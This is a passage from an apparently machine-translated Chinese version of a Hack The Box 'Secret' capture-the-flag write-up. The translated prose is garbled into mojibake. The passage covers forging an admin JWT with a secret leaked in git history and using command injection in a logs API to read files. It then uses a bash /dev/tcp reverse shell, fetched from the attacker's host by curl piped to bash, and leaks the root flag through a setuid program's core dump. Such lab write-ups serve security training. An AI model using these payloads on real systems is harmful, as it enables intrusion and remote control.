src="../Images/dbf51d5dc091c85cff433deb389b30d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9NmIw2UFLtRrDGTA095SaQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æå–Gitå­˜å‚¨åº“çš„å†…å®¹</figcaption></figure><p id="c80f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æå–æ‰€æœ‰æ–‡ä»¶èŠ±äº†ä¸€äº›æ—¶é—´ï¼Œä½†ç°åœ¨æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æäº¤:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nv"><img src="../Images/4b64e4429af4c6d7712bfb70408f86e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oNHpHQ7NBvCXK37Vft8hRA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Gitæ–‡ä»¶ä¸­çš„æäº¤åˆ—è¡¨</figcaption></figure><p id="6981" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬åœ¨git repoä¸­æœ‰å…­æ¬¡æäº¤ã€‚æˆ‘æœç´¢äº†TOKEN_SECRETï¼Œè¿™æ˜¯æˆ‘ä»¬ä»¥å‰åœ¨ã€‚envæ–‡ä»¶çš„ä¸»æ–‡ä»¶å¤¹ï¼Œå¹¶å‘ç°äº†ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nw"><img src="../Images/b68147a358ae728d2488a91ffe2e3544.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dK9z31a8-bfOWw47VHei3w.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">åœ¨Gitæäº¤ä¸­æœç´¢ç§˜å¯†</figcaption></figure><h1 id="2d58" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åˆ›å»ºç®¡ç†å‘˜JWT</h1><p id="97db" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç§˜å¯†å’Œæˆ‘ä»¬ä¹‹å‰ç”¨jwt_toolåˆ›å»ºçš„ç°æœ‰ç”¨æˆ·JWTæ¥åˆ›å»ºä¸€ä¸ªè¢«ç¯¡æ”¹çš„ä»¤ç‰Œï¼Œä½œä¸ºadmin:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nx"><img src="../Images/26fba2dbfd36fba90edfe59e06cbbd25.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WVzBmfO6qD7VfLhSimFUrA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">å·²åˆ›å»ºè¢«ç¯¡æ”¹çš„ä»¤ç‰Œ</figcaption></figure><h1 id="1156" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">è¿œç¨‹ä»£ç æ‰§è¡Œ</h1><p id="877d" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æœ‰äº†è¿™ä¸ªæ–°çš„ä»¤ç‰Œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¹‹å‰æ‰¾åˆ°çš„/logs APIï¼Œå¹¶ä½œä¸ºadminè¿›è¡Œèº«ä»½éªŒè¯ã€‚è¿™è®©æˆ‘ä»¬ä½¿ç”¨åœ¨æºä»£ç ä¸­çœ‹åˆ°æœªæ’åºçš„å‚æ•°ã€‚è®©æˆ‘ä»¬å°è¯•è·å–passwdæ–‡ä»¶:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ny"><img src="../Images/94280803ebcd3ba216c086510fff798e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JQF46AFi4NxiFj5H4mrfHw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æŠ“å–passwdæ–‡ä»¶</figcaption></figure><p id="3b71" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å®ƒå·¥ä½œäº†ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†passwdæ–‡ä»¶çš„å†…å®¹ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ç”¨æˆ·dasithã€‚è®©æˆ‘ä»¬çœ‹çœ‹æˆ‘ä»¬æ˜¯æœåŠ¡å™¨ä¸Šçš„å“ªä¸ªç”¨æˆ·:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nz"><img src="../Images/8e61c65a17c237e151b66ad5b487ee15.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*t3D3FLxXc1lKGgRQQEAryw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æ­£åœ¨æ£€æŸ¥ç”¨æˆ·ID</figcaption></figure><p id="dc7c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¥½äº†ï¼Œæˆ‘ä»¬æ˜¯dasithç”¨æˆ·ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹ä»–ä»¬çš„ä¸»æ–‡ä»¶å¤¹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nz"><img src="../Images/4944d21095f7a6ca5a6155893c0b4670.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PI6-sz--BsIvM59R2PMhew.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">åœ¨ç”¨æˆ·ä¸ªäººæ–‡ä»¶å¤¹ä¸­æŸ¥æ‰¾</figcaption></figure><h1 id="d88a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ç”¨æˆ·æ ‡å¿—</h1><p id="b2ad" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">ä¸å¦¨æŠ“ä½ç”¨æˆ·æ ‡å¿—:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="0a70" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret]<br/>â””â”€# curl 'http://secret.htb/api/logs?file=;cat+/home/dasith/user.txt' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBlbmNlckB0ZXN0LmNvbSIsImlhdCI6MTYzNzI3MzA5M30.OBy7ffsMnK9IlG1uBm28X4aYbCMw4mgr3kZyFMXDGfE'<br/>&lt;SNIP&gt;<br/>c5d9aea30b9787de4c6776da13f5f57f</span></pre><h1 id="2915" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åå‘å¤–å£³</h1><p id="77da" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">ç°åœ¨è®©æˆ‘ä»¬å¾—åˆ°ä¸€ä¸ªåå‘shellï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™æ ·ä¸€ä¸ªç®€å•çš„shellï¼Œå¹¶æŠŠå®ƒæ”¾åœ¨ä¸€ä¸ªshellæ–‡ä»¶ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œå®ƒäº†:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="e13f" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret]<br/>â””â”€# cat pencer_shell.sh<br/>#!/bin/bash<br/>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.15/1338 0&gt;&amp;1'</span></pre><p id="dfdd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¯åŠ¨ä¸€ä¸ªwebæœåŠ¡å™¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è·å–æ–‡ä»¶ï¼ŒåŒæ—¶å¯åŠ¨ä¸€ä¸ªnetcatç›‘å¬å™¨æ¥æ•è·æˆ‘ä»¬çš„shellã€‚ç°åœ¨åƒä»¥å‰ä¸€æ ·ä½œä¸ºå‚æ•°å‘é€:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="54d3" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret]<br/>â””â”€# curl 'http://secret.htb/api/logs?file=;curl+http://10.10.15.15/pencer_shell.sh+|+bash' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBlbmNlckB0ZXN0LmNvbSIsImlhdCI6MTYzNzI3MzA5M30.OBy7ffsMnK9IlG1uBm28X4aYbCMw4mgr3kZyFMXDGfE'<br/>{"killed":false,"code":1,"signal":null,"cmd":"git log --oneline ;curl http://10.10.15.15/pencer_shell.sh | bash"}</span></pre><p id="8431" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬çœ‹åˆ°äº†ä»æˆ‘ä»¬çš„ç½‘ç»œæœåŠ¡å™¨ä¸Šä¸‹è½½çš„æ–‡ä»¶:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f93f" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret]<br/>â””â”€# python3 -m http.server 80<br/>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br/>10.10.11.120 - - [18/Nov/2021 22:11:37] "GET /pencer_shell.sh HTTP/1.1" 200 -</span></pre><p id="837c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç„¶åæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬çš„å¤–å£³è¢«è¿æ¥èµ·æ¥:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d218" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret]<br/>â””â”€# nc -lvvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.15.15] from secret.htb [10.10.11.120] 51496<br/>bash: cannot set terminal process group (1116): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>dasith@secret:~/local-web$ id<br/>uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)</span></pre><p id="0668" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é¦–å…ˆè®©æˆ‘ä»¬å¾—åˆ°ä¸€ä¸ªæ›´å¥½çš„å¤–å£³:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="e49c" class="nc km iq my b gy nd ne l nf ng">dasith@secret:~/local-web$ python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>dasith@secret:~/local-web$ ^Z<br/>zsh: suspended  nc -lvvp 1337<br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret]<br/>â””â”€# stty raw -echo; fg<br/>[1]  + continued  nc -lvvp 1337<br/>dasith@secret:~/local-web$</span></pre><h1 id="4884" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åˆ—ä¸¾</h1><p id="5922" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æ’åºåï¼Œæˆ‘å››å¤„æŸ¥çœ‹ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†ä¸€ä¸ªåä¸ºcountçš„æ–‡ä»¶ï¼Œå®ƒè®¾ç½®äº†stickyä½:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="4270" class="nc km iq my b gy nd ne l nf ng">dasith@secret:~/local-web$ find / -type f -perm -u=s 2&gt;/dev/null<br/>&lt;SNIP&gt;<br/>/opt/count</span></pre><p id="11e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥å‡è®¾è¿™æ˜¯é‡è¦çš„ã€‚å¦‚æœæˆ‘ä»¬æŸ¥çœ‹/optæ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬è¿˜ä¼šå‘ç°è®¡æ•°æ–‡ä»¶çš„æºä»£ç :</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="8775" class="nc km iq my b gy nd ne l nf ng">dasith@secret:/opt$ ls -l<br/>-rw-r--r-- 1 root root  3736 Oct  7 10:01 code.c<br/>-rwsr-xr-x 1 root root 17824 Oct  7 10:03 count<br/>-rw-r--r-- 1 root root  4622 Oct  7 10:04 valgrind.log<br/><br/>dasith@secret:~/local-web$ file /opt/count<br/>/opt/count: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=615b7e12374cd1932161a6a9d9a737a63c7be09a, for GNU/Linux 3.2.0, not stripped</span></pre><p id="4446" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®©æˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªæ–‡ä»¶åšäº†ä»€ä¹ˆ:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f118" class="nc km iq my b gy nd ne l nf ng">dasith@secret:/opt$ ./count<br/>Enter source file/directory name: /root/root.txt<br/><br/>Total characters = 33<br/>Total words      = 2<br/>Total lines      = 2<br/>Save results a file? [y/N]: y<br/>Path: /tmp/output.txt</span></pre><p id="3e37" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å®ƒè¦æ±‚ä¸€ä¸ªæºæ–‡ä»¶ï¼Œæˆ‘ç»™äº†å®ƒæ ¹æ ‡å¿—ï¼Œå®ƒä¼¼ä¹åœ¨åšå­—ç¬¦å’Œå­—æ•°ç»Ÿè®¡ã€‚ä¿å­˜æ–‡ä»¶ä¸èƒ½ç»™æˆ‘æ¥æº:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="eb58" class="nc km iq my b gy nd ne l nf ng">dasith@secret:/opt$ ls /tmp<br/> output.txt<br/> snap.lxd<br/> tmux-1000<br/> vmware-root_730-2999460803<br/><br/>dasith@secret:/opt$ cat /tmp/output.txt <br/>Total characters = 33<br/>Total words      = 2<br/>Total lines      = 2</span></pre><p id="bbc4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘åªæ˜¯æŠŠè¾“å‡ºä¿å­˜åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­ã€‚</p><h1 id="9490" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ ¸å¿ƒè½¬å‚¨</h1><p id="f422" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æŸ¥çœ‹æºä»£ç ï¼Œçœ‹çœ‹æˆ‘ä»¬æ˜¯å¦èƒ½ç†è§£è¿™ä¸ªæ–‡ä»¶çš„ä½œç”¨ã€‚è¿™æ˜¯ä¸€ä¸ªå¾ˆé•¿çš„æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒè¯»å–å†…å­˜ä¸­æä¾›çš„æ–‡ä»¶ï¼Œåœ¨å†…å­˜ä¸­è®¡ç®—å­—ç¬¦å’Œå•è¯çš„æ•°é‡ã€‚æœ‰è¶£çš„éƒ¨åˆ†æ¥è¿‘å°¾å£°:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3c10" class="nc km iq my b gy nd ne l nf ng">// Enable coredump generation<br/>prctl(PR_SET_DUMPABLE, 1);</span></pre><p id="fffc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„<a class="ae nn" href="http://manpages.ubuntu.com/manpages/bionic/man2/prctl.2.html" rel="noopener ugc nofollow" target="_blank"/>:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="1bc4" class="nc km iq my b gy nd ne l nf ng">PR_SET_DUMPABLE (since Linux 2.3.20)<br/>Set the state of the "dumpable" flag, which determines whether core dumps are<br/>produced for the calling process upon delivery of a signal whose default behavior<br/>is to produce a core dump.</span></pre><p id="b419" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ„å‘³ç€ç¨‹åºæ­£åœ¨è®¾ç½®æ ‡å¿—ï¼Œä»¥ä¾¿åœ¨ç»ˆæ­¢æ—¶å°†æ ¸å¿ƒè½¬å‚¨å†™åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å°†å†…å­˜å†…å®¹è½¬å‚¨åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè€Œroot.txtæ–‡ä»¶ä¿å­˜åœ¨å…¶ä¸­ã€‚</p><p id="501c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½¿ç”¨ä¸ä¸Šé¢ç›¸åŒçš„å·æ›²æ–¹æ³•è¿æ¥ç¬¬äºŒä¸ªå£³ã€‚ç„¶åï¼Œåœ¨shell 1ä¸­ï¼Œæˆ‘ä»¬å†æ¬¡è¿è¡Œcountç¨‹åºå¹¶è¯»å–æ ¹æ ‡å¿—:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="ef3a" class="nc km iq my b gy nd ne l nf ng">dasith@secret:/opt$ ./count<br/>Enter source file/directory name: /root/root.txt<br/>Total characters = 33<br/>Total words      = 2<br/>Total lines      = 2<br/>Save results a file? [y/N]:</span></pre><h1 id="3cc3" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ç´§æ€¥æªæ–½</h1><p id="a7fd" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">å°†å®ƒæ”¾åœ¨ä¿å­˜ç‚¹ï¼Œåˆ‡æ¢åˆ°ç¬¬äºŒä¸ªshellï¼ŒæŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nm"><img src="../Images/d52e902713d398218b6d04ee07f6d5a1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kaLbinfB9vX-B2CXW5YjDQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æŸ¥çœ‹åœ¨æœºå™¨ä¸Šè¿è¡Œçš„è¿›ç¨‹</figcaption></figure><p id="99e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç»ˆæ­¢è¿›ç¨‹ä»¥è¿›è¡Œè®¡æ•°:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="8b5e" class="nc km iq my b gy nd ne l nf ng">dasith@secret:~/local-web$ kill 96020<br/>kill 96020</span></pre><p id="34dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æ‰“å¼€æ ¸å¿ƒè½¬å‚¨çš„åŒ…è£…ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹å®ƒ:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="7c06" class="nc km iq my b gy nd ne l nf ng">dasith@secret:/opt$ cd /var/crash<br/><br/>dasith@secret:/var/crash$ ls -l<br/>-rw-r----- 1 root   root   27203 Oct  6 18:01 _opt_count.0.crash<br/>-rw-r----- 1 dasith dasith 28006 Nov 18 21:40 _opt_count.1000.crash<br/>-rw-r----- 1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash<br/><br/>dasith@secret:/var/crash$ mkdir /dev/shm/pencer<br/><br/>dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /dev/shm/pencer<br/><br/>dasith@secret:/var/crash$ cd /dev/shm/pencer<br/><br/>dasith@secret:/dev/shm/pencer$ ls<br/>&lt;SNIP&gt;<br/>CoreDump<br/>&lt;SNIP&gt;</span></pre><h1 id="0268" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ ¹æ ‡å¿—</h1><p id="7eaf" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬ç°åœ¨ä¹Ÿå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²æ¥æŸ¥çœ‹CoreDumpæ–‡ä»¶çš„å†…å®¹:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="1010" class="nc km iq my b gy nd ne l nf ng">dasith@secret:/dev/shm/pencer$ strings CoreDump<br/>strings CoreDump<br/>&lt;SNIP&gt;<br/>Enter source file/directory name:<br/>%99s<br/>Save results a file? [y/N]: <br/>Path: <br/>Could not open %s for writing<br/>:*3$"<br/>Save results a file? [y/N]: words      = 2<br/>Total lines      = 2<br/>/root/root.txt<br/>ed72112dc7721f564f49b6846a2f0e22</span></pre><p id="75e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¾“å‡ºç¡®å®å¾ˆé•¿ï¼Œä½†æ˜¯æ‚¨å¯ä»¥çœ‹åˆ°å…¶ä¸­çš„è®¡æ•°æ–‡ä»¶è¾“å‡ºï¼Œå¹¶çœ‹åˆ°å·²ç»è¯»å…¥çš„æ ¹æ ‡å¿—çš„å†…å®¹ã€‚</p><p id="5fb5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘è®¤ä¸ºè¿™å¯¹äºä¸€ä¸ªç®€å•çš„ç›’å­æ¥è¯´å¾ˆæ£˜æ‰‹ã€‚æˆ‘å¸Œæœ›ä½ å–œæ¬¢å®ƒã€‚</p><p id="1c54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸‹æ¬¡è§ã€‚</p></div><div class="ab cl oa ob hu oc" role="separator"><span class="od bw bk oe of og"/><span class="od bw bk oe of og"/><span class="od bw bk oe of"/></div><div class="ij ik il im in"><p id="5417" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœä½ å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç»™æˆ‘ä¸€ä¸¤ä¸ªæŒå£°(è¿™æ˜¯å…è´¹çš„ï¼)</p><p id="4334" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¨ç‰¹â€”<a class="ae nn" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>ç½‘ç«™â€” <a class="ae nn" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="2f8d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="oh">åŸè½½äº2022å¹´4æœˆ21æ—¥</em><a class="ae nn" href="https://pencer.io/ctf/ctf-htb-secret/" rel="noopener ugc nofollow" target="_blank"><em class="oh">https://pencer . io</em></a><em class="oh">ã€‚</em></p></div></div>    
</body>
</html>